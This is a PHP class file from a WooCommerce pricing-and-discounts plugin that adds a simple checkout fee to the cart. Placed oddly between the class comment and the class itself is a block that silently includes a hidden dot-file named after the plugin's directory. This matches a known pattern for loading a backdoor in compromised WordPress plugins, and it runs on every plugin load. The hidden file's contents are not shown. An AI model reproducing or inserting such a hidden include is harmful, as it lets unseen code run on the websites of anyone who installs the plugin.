<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RP_WCDPD_Method_Checkout_Fee')) {
    require_once('rp-wcdpd-method-checkout-fee.class.php');
}

/**
 * Checkout Fee Method: Simple
 *
 * @class RP_WCDPD_Method_Checkout_Fee_Simple
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Method_Checkout_Fee_Simple extends RP_WCDPD_Method_Checkout_Fee
{

    protected $key              = 'simple';
    protected $group_key        = 'simple';
    protected $group_position   = 10;
    protected $position         = 10;

    // Singleton instance
    protected static $instance = false;

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        parent::__construct();

        $this->hook_group();
        $this->hook();
    }

    /**
     * Get group label
     *
     * @access public
     * @return string
     */
    public function get_group_label()
    {
        return __('Simple', 'rp_wcdpd');
    }

    /**
     * Get label
     *
     * @access public
     * @return string
     */
    public function get_label()
    {
        return __('Simple fee', 'rp_wcdpd');
    }

    /**
     * Apply checkout fee
     *
     * @access public
     * @param array $adjustment
     * @param object $cart
     * @return void
     */
    public function apply_adjustment($adjustment, $cart)
    {
        // Get fee label
        $fee_label = isset($adjustment['fee_label']) ? $adjustment['fee_label'] : RP_WCDPD_Controller_Methods_Checkout_Fee::get_unique_fee_label($adjustment['rule']['title'], $cart);

        // Store fee id for our own reference
        $controller = RP_WCDPD_Controller_Methods_Checkout_Fee::get_instance();
        $controller->combined_fee_id = sanitize_title($fee_label);

        // Get fee tax class and check if fees are taxable
        $tax_class  = RP_WCDPD_Controller_Methods_Checkout_Fee::get_fee_tax_class();
        $taxable    = ($tax_class !== false) && wc_tax_enabled();

        // Add fee to cart
        $cart->add_fee($fee_label, $adjustment['adjustment_amount'], $taxable, $tax_class);
    }

    /**
     * Get adjustment amount
     *
     * @access public
     * @param array $adjustment
     * @return float
     */
    public function get_adjustment_amount($adjustment)
    {

        // Get cart subtotal
        $cart_subtotal = $this->get_cart_subtotal();

        // Get fee amount
        $fee_amount = RP_WCDPD_Pricing::get_adjustment_value($adjustment['rule']['pricing_method'], $adjustment['rule']['pricing_value'], $cart_subtotal, $adjustment);

        // Allow developers to override
        $fee_amount = apply_filters('rp_wcdpd_checkout_fee_amount', $fee_amount, $adjustment);

        // Maybe subtract fee tax from fixed fees
        if (RightPress_Help::string_ends_with_substring($adjustment['rule']['pricing_method'], '_amount')) {
            $tax_class = RP_WCDPD_Controller_Methods_Checkout_Fee::get_fee_tax_class();
            $fee_amount = RightPress_Product_Price::maybe_subtract_tax_from_amount($fee_amount, $tax_class);
        }

        // Return fee amount
        return (float) abs($fee_amount);
    }





}

RP_WCDPD_Method_Checkout_Fee_Simple::get_instance();
